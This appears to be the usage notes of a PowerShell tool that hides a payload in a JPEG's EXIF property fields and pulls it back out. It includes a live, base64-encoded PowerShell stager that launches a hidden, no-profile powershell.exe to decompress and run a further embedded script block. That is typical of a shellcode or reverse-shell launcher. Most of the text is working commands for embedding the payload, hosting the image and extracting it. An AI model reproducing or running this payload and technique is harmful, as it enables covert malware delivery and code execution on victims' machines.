Test for writable properties in a image:

cd Test_Properties
.\PropertyTester.ps1 .\doge.jpg

Generate image with a payload:

cd Generate_Image
$ogPocString = 'aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEASgBuADcAYgBsAHcAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBuAEUAcgA5AEQAMQBhAEYAWgBGAHMAaABHAEIATABhAHQASgBFAHEAMwBaAHAAWABVADUAeABBAEQAQQBSAEMAMABXAGwAagByADgAMwBDADIAZwB2AHIATgBRAFIANgAvAGUAOAAzAEIAcgB0AE4AMQBlAFMAdQBQAGUAawBzAFgAdgBaAGwAWgBuAGIAbQBtAFcAZABtADcAUwBlAFIASwB5AG0AUABGAEkAawB2AHEAbAB2AGwAeQArAHQAWABKAHoAMABzAGMASwBoAG8AaABhADMAdgBEAFQAWgBGAHAAYwBEAGIAKwBzAGsASgByAEIAZQBXADEATwBvAHIASAB4AFYAdABpAGwAYQByAE8AZwA4AHgAagBXAFoAWABWADcAVgBFAEMAQgBMAEoANAA3AHoAVQBJAGgATABGAE0AUQBrAGYARwBDAFcAeABwAGkAdAAvAEsAWABkAHoASQBzAGoAWgB6AGMATwBDAHUARgBMADUAbwBoAFQAKwBMAEwAVQBZAGYAOABBAHMARQA5AHYAVgBzAEQAcwBuAHkAaABtAEsAdgBIAFMAdgB5ADEAMgBjAHUAbABOAHkAVgBvAHgASwBUAGYAMwA4AFcAZABXAG4AWgA1AFYAWgBxAGIARgBPAE0ASQBzADEAMQBkAG4ARgBrAG8AUQBsAGoAegBGAFYAVgA3ADcAcQA2AFkARwBEADMAWQBwAG8AcQBrADEAZAB3AFcAUAB1AHkAOQBJAGQAagBTADcATwBTADgATQBvAHgAagA2ADUAQgBtAHMAYgBZAGgATQA1ADUAMQA2AHMANgBoAEEARgBmAEEAUwBSAGkAWQBpAFUAUQB6AHkAcABnAGUATwAyAHAAcwBLAHcASgA3AGkATABQAEUAKwBRAEcASwBSAEwAVgByAFQAaABTADYASQBWAG8AbwBTAHgAbwB2AEsASABOAHMAMQBPAHYAMAAwAGkAUwBVAE0AQwArADUASQBJAHYAbgBLAEkAMgBGAEMAWAB4AEsAVQAyAGoAagB4AEcAYgBvAGsALwAwADYANwBKAE4AZwAvADYAVgA1AFcAMABwADAAbwBnADEAWgBOAEMATAAwAEkAZQBuAG4ASABUADUAbAA3AEMAeQBGAEYAVAAxAFgAOQAyADkASgBnADcASABaADUAagAvAGkARAB3AHIANgA5AGYAdgBYADcAbAA1ADkAawBtAHkAMwBDAHgAZQBaAHAAdABHAEoAMQBNAEQAMgBNAEMANwBtAGsAOQBIAHQATwBEADQARQBlAGwAWABGAFIAcwBPAEEAaABMAEwAbgBZAHcATABRAHgARQBRAHYAUwBaAE0AawAxAGgAbgA4ADUAbQBBAEcAUABTAGIAeABWAGYAMQBxAC8AawB3AGkAQQBxAFcAQQBJAHIAMAB4AEcAbgAzAGcAdwAwAHMAbgB3AFUASAB1ADcAVAAxAFoAZABaAFYAUwBjACsAagBVAGgAOQBGACsARwBRAHUAagBsAHgAdABPAGMAdwBKAGoANABqAGgAdwBoAEwAdQBkAGcAMQBlAEsAUwBwADIAUQBiAHgANgBvAFMAUgBBAE0AcwBVAHQAYQBJAHkALwBWAG0AdABFAFYATAA1AFQAZABkAE0ASwBQAE8ASQBRAEMANwBrAEsAUQBhAHYASQBJAFgANgBqADgANABjAEUANgBHAHAAVgBtAFMAVABFAEEAQQA2AHoAbABWAEEAMwBRAGUANgBrAGwAdwA2AG8AKwBnAHUAUAB6ADIAZABnADUAQgBhAFkAegBpAE8AaQAwAG8AdgBnAFgAcAB4AGkANABwAEQATQBDAE4AZQBVAFUARgBSAFQATABNAHQAbABFAGgAKwBHAEsAcgBmADMAYgBVAFQASgBxAG0ATABZADUAbQBiAG0AKwBsAEgARgBMAFAAVABhAGoAeQBLAHAAVQBoAGMAeQBCAGgARQBQAG4AQgBXAHgASwBXAFkAcABVAEEAVQBsAFQAYgAxAGkATABsAHoAYQBKAEMAZgBxAGoANABMAFEAdwAwAHoAUgBxAE0AQQBMAEcAMABnAEQAYgBDAFMAaAB1AC8ASQBsAEEAYwBDAEgARAB6AGsAWABDADgANQBSAEYAcgBoAGkAcABFAFEAWgBBADUAbAAyADIAUQA0AGcAQwBMAE4AcQBIADQAZwBEAGcANgBJAHAALwA3AG8AWAAwADcAawBJADIAdABUAEgASABJAEEAbgBuAGcASAB5AFgAVQBZAGwAMABWAGwAUgBJAFcARQAyAGsAOAB4AEIAZgByADgAdAA3AE8AZgBGAEQAMQA0AFUAUgBNAGsAeQA0AEcAVwBGADgAYgBVADMATQBtAFUAegBZAFgAZABZAEoATgB5AE0AVQBQAGsARQBMACsAUQBFAEgAdABUADgATgBEAEUATQBYAGwAWABkAGEAUQBBAFoATABRADMAeABnADIAdABJAFgAZwBtAFYAcwBSAHMAMQAxAHoAUwBDAHQAcgBTAGkAbQBYAEQAZAAwAGcAdgBMAEYANgAvADkARAA1ADEARgBtADEARAAxAEIALwBuAFAAcgBKAGkAeQAyADcAMwA2AHYAMQAyAHUANwByAHAATwBLAE8AcQBkAEIAcQBXAC8ATgBTAHoAcABOADAAWQBMAHgAWQBPAGEAdAA4AE8ASgAvAEwAZQBRAHUAMABCAEwAUwA4AG4AMQBmADIAcQBRAC8AZABPAEYAMwBtAFQAUgArAFAAZAAzAHQAeAB2AHkAKwBiAGoAZgBoAEYANAAvAHEAVAB1ACsAOABHAGwANwA5AHgAVwAzAGoAWgBwADkANgA3AFcATgA4AHYAbgB1AEYAdAB2AEoATgAwADcAYwAyAHUAVwBxADMARwBEAGIAdAB0ADkATwB1AHcAdgBPADAAMwA1AE0AQgBrAHgAUABQAFMATgBZAEYAegA1AGcATwBsAGoAVgB5AHgARwBGAFcANwB2AEwAWQBSAGEAOAB3AHQAMwAzAC8ARgBIAHIAYgBuAHQANwBTAFoAdABTAGgAWgBHAHUAVQB2ADcAcQBJAC8AUQBKAC8AZAAyAE8ARwB3AEYAcQA2AEEAVgBJACsAUABEAGEARgAwAEwARgAyAGgAZABEACsAbwBZAFcAYQBnAHgAMgBuAFgAZQBNAHIATQAvAGIASgBwAG8AMgBEAEQANwArAEkAYgAzAEwAawA3AHIAUgB1AFgAZQBXAHoAZQBhADkAMgBQAGMAQwBaAG4AWABhAGgAdQBWAHkAUgBoADUAUwBCAGkARABZAEYANgA1AHYASgBsAEgASwBVADQANABNAE4AZABtAEsAbwBPADYAOQA3AHUAbQBBAFQASwA5AEsAbQBwAFgAegArAG4AKwBmAHQAMQB2AEIAYQBnAEIATQBxAE8AUQBJADkAeQBrAHkAKwBIAHAARwBHAHgAZQBEADAARABuAGIAbABqAHgATwBKAEsAUgBOAFQAYQBNAFUAVwBBAEUAeQBIAGYAbQBFADQAeABNAGsARABiAFgAcQBHAG4AeQAyAHUANQA5AHoAKwA0AFoAbwA5AEgANQB2AFAASwB3AHIATQB6AEIAWgB6AEwAZQB2AEwAYwA3ADYATABUAHAAOQBnAHoARABPAEEAMABmADQATgBkAEEAcgByADEANgBqAE0AYgBtADkAbgBLAHoAbABiAGgAegBCADcAWQBIAHgAbwBmAGgAeAB6AGMAcABRAFkAQQBoAEIAVgBwACsALwB5AFQAMQBMADcAVgByAEcANAB0ADQAagBoAGwAUQBBAHYAcAB3AFgAbwBCAE4ATABwAHAAWgBhACsAMQB4AG0AbQBwAG8AMgB2AEYAQwBYAFIASQBSAEUAUQBiADMARQBkAHgAWQBPAFoAVQBSAFkAOQB4AE4AVwAvAHUAeABDADgATwA5AGMAdQB6ADIATQB5AGoARgBJAFEAdwB2AHoAcAA4AGQANgBjAG8AMwBRAGYAMQA3AHoAOAArAFgAcgBxADcAdQB3AFUAOABvAEQAMgBCAHcAcQBVAHUAaQBRAE0ANgBMADUAYwBlAEwAYwBoAG4ANgBkAC8AbQB4AFcAbwBZAG8AZgB6ADIAMABHAGwALwB0AHQATgBSAFMATQBXADMALwBLAFQASwBaAFkAWABZAHcAcgBLAGMAbABVAC8AQgB1AC8AbQBlADQAcwBqAHEAZAB3ADUALwAzAHIAMwBCADkAWAAvAHUASAAzAFYAKwBDAHMARgB3ADgAQgBQAHoAVAA2AG8AOABMAHYANABYAG4ANwA4AGQAKwBoADYAawBFAFUAUQBkAGEARABTAFAASABTACsANABGAEMARABKAHkAUABIAGsATAA4AEcANABnADgAMwA3ADIAcABPADkAZwBOADQAawA4AHUANABaAFgAZwA3ADgAQgBCAGkAaABXADYATwAwAEoAQQBBAEEAPQAnACcAKQApACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA'
.\Scotty.ps1 -WImagePath '.\doge.jpg' -WImagePathNew '.\doge2.jpg' -ImageURL 'http://localhost:2015/doge2.jpg' -WPayLoad $ogPocString

Load image in a variable:

Add-Type -AssemblyName system.drawing
$ImagePath = '.\doge2.jpg'
$absOriginalImagePath = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($pwd, $ImagePath))
$Image = New-Object -TypeName system.drawing.bitmap -ArgumentList $absOriginalImagePath

Show image properties:

$Image.PropertyIdList

Show image properties content:

[System.Text.Encoding]::Unicode.GetString($Image.GetPropertyItem(282).Value)

Show property index:

[System.Text.Encoding]::Unicode.GetString($Image.GetPropertyItem(293).Value)

Show the full image stored payload:

Add-Type -AssemblyName system.drawing
$ImagePath = '.\doge2.jpg'
$absOriginalImagePath = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($pwd, $ImagePath))
$Image = New-Object -TypeName system.drawing.bitmap -ArgumentList $absOriginalImagePath
$storagePropertiesValue  = [System.Text.Encoding]::Unicode.GetString($Image.GetPropertyItem(293).Value)
[int32[]]$storageProperties = $storagePropertiesValue.Split(",")
$PocString = ""
foreach ($property in $storageProperties)
	{
		$ImageProperty = $Image.GetPropertyItem($property)
		$PocString = $PocString + [System.Text.Encoding]::Unicode.GetString($ImageProperty.Value)
	}
$Image.Dispose()
